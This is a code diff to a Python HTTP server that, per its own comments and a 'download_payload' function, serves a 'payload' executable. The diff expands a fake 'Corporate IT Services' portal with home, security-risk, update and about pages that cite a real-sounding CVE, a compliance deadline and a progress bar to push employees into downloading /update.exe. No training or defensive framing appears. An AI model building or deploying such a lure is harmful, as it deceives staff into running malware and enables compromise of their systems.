@@ -39,6 +39,26 @@ def download_payload():
 # HTTP server to serve init.exe and update portal
 class HTTPHandler(BaseHTTPRequestHandler):
     def do_GET(self):
+        # Common nav bar for all pages
+        nav_bar = """
+        <nav class="bg-blue-600 text-white py-4">
+            <div class="container mx-auto px-4 flex justify-between items-center">
+                <h1 class="text-xl font-bold">Corporate IT Services</h1>
+                <div class="space-x-4">
+                    <a href="/" class="hover:text-gray-200 {}">Home</a>
+                    <a href="/security" class="hover:text-gray-200 {}">Security Risks</a>
+                    <a href="/update" class="hover:text-gray-200 {}">Update</a>
+                    <a href="/about" class="hover:text-gray-200 {}">About</a>
+                </div>
+            </div>
+        </nav>
+        """.format(
+            "font-semibold" if self.path == "/" else "",
+            "font-semibold" if self.path == "/security" else "",
+            "font-semibold" if self.path == "/update" else "",
+            "font-semibold" if self.path == "/about" else ""
+        )
+
         if self.path == '/update.exe':
             self.send_response(200)
             self.send_header('Content-type', 'application/octet-stream')
@@ -51,36 +71,119 @@ class HTTPHandler(BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-            html = """
+            html = f"""
             <html>
                 <head>
-                    <title>Corporate System Update</title>
+                    <title>Corporate IT Services</title>
                     <meta name="viewport" content="width=device-width, initial-scale=1.0">
                     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                 </head>
                 <body class="bg-gray-100 font-sans">
-                    <!-- Header -->
-                    <header class="bg-blue-600 text-white py-4">
-                        <div class="container mx-auto px-4">
-                            <h1 class="text-2xl font-bold">Corporate IT Services</h1>
-                        </div>
-                    </header>
+                    {nav_bar}
                     <!-- Hero Section -->
                     <section class="py-12 text-center">
                         <div class="container mx-auto px-4">
                             <h2 class="text-3xl font-semibold text-gray-800 mb-4">Critical System Update Required</h2>
-                            <p class="text-lg text-gray-600 mb-6">Install the latest update by July 10, 2025, to maintain network access and ensure security compliance.</p>
-                            <!-- Fake Progress Bar -->
+                            <p class="text-lg text-gray-600 mb-6">A critical security update is required by July 10, 2025, to maintain network access and protect against vulnerabilities.</p>
+                            <a href="/update" class="inline-block bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg hover:bg-blue-700 transition">Install Update Now</a>
+                        </div>
+                    </section>
+                    <footer class="bg-gray-800 text-white py-4">
+                        <div class="container mx-auto px-4 text-center">
+                            <p>© 2025 Corporate IT Services. All rights reserved.</p>
+                        </div>
+                    </footer>
+                </body>
+            </html>
+            """
+            self.wfile.write(html.encode('utf-8'))
+        elif self.path == '/security':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            html = f"""
+            <html>
+                <head>
+                    <title>Security Risks - Corporate IT Services</title>
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+                </head>
+                <body class="bg-gray-100 font-sans">
+                    {nav_bar}
+                    <section class="py-12">
+                        <div class="container mx-auto px-4">
+                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">Security Risks</h2>
+                            <h3 class="text-xl font-semibold text-gray-700 mb-2">CVE-2024-30051: Windows DWM Core Library Vulnerability</h3>
+                            <p class="text-lg text-gray-600 mb-4">A heap-based buffer overflow in the Windows Desktop Window Manager (DWM) Core Library (CVSS 7.8) allows local attackers to escalate privileges to SYSTEM level. Discovered in early 2024, this vulnerability requires user interaction, such as running a malicious file, to exploit. Microsoft released a patch in May 2024.</p>
+                            <p class="text-lg text-gray-600 mb-4">Unpatched systems are at risk of malware, data theft, and unauthorized access. Install the latest update to mitigate this threat.</p>
+                            <a href="/update" class="inline-block bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg hover:bg-blue-700 transition">Download Update</a>
+                        </div>
+                    </section>
+                    <footer class="bg-gray-800 text-white py-4">
+                        <div class="container mx-auto px-4 text-center">
+                            <p>© 2025 Corporate IT Services. All rights reserved.</p>
+                        </div>
+                    </footer>
+                </body>
+            </html>
+            """
+            self.wfile.write(html.encode('utf-8'))
+        elif self.path == '/update':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            html = f"""
+            <html>
+                <head>
+                    <title>System Update - Corporate IT Services</title>
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+                </head>
+                <body class="bg-gray-100 font-sans">
+                    {nav_bar}
+                    <section class="py-12 text-center">
+                        <div class="container mx-auto px-4">
+                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">Install System Update</h2>
+                            <p class="text-lg text-gray-600 mb-6">Download and install the latest update by July 10, 2025, to protect against critical vulnerabilities like CVE-2024-30051.</p>
                             <div class="w-1/2 mx-auto bg-gray-200 rounded-full h-2.5 mb-6">
                                 <div class="bg-blue-600 h-2.5 rounded-full" style="width: 75%"></div>
                             </div>
                             <a href="/update.exe" class="inline-block bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg hover:bg-blue-700 transition">Download Update Now</a>
                         </div>
                     </section>
-                    <!-- Footer -->
                     <footer class="bg-gray-800 text-white py-4">
                         <div class="container mx-auto px-4 text-center">
-                            <p>&copy; 2025 Corporate IT Services. All rights reserved.</p>
+                            <p>© 2025 Corporate IT Services. All rights reserved.</p>
+                        </div>
+                    </footer>
+                </body>
+            </html>
+            """
+            self.wfile.write(html.encode('utf-8'))
+        elif self.path == '/about':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            html = f"""
+            <html>
+                <head>
+                    <title>About Us - Corporate IT Services</title>
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+                </head>
+                <body class="bg-gray-100 font-sans">
+                    {nav_bar}
+                    <section class="py-12">
+                        <div class="container mx-auto px-4">
+                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">About Our IT Team</h2>
+                            <p class="text-lg text-gray-600 mb-4">Our dedicated IT team ensures your systems are secure and up-to-date. With over 20 years of experience, we provide cutting-edge solutions to protect your network.</p>
+                            <p class="text-lg text-gray-600 mb-4">Contact us at support@corporateit.com for assistance with the latest system update.</p>
+                            <a href="/update" class="inline-block bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg hover:bg-blue-700 transition">Get the Update</a>
+                        </div>
+                    </section>
+                    <footer class="bg-gray-800 text-white py-4">
+                        <div class="container mx-auto px-4 text-center">
+                            <p>© 2025 Corporate IT Services. All rights reserved.</p>
                         </div>
                     </footer>
                 </body>
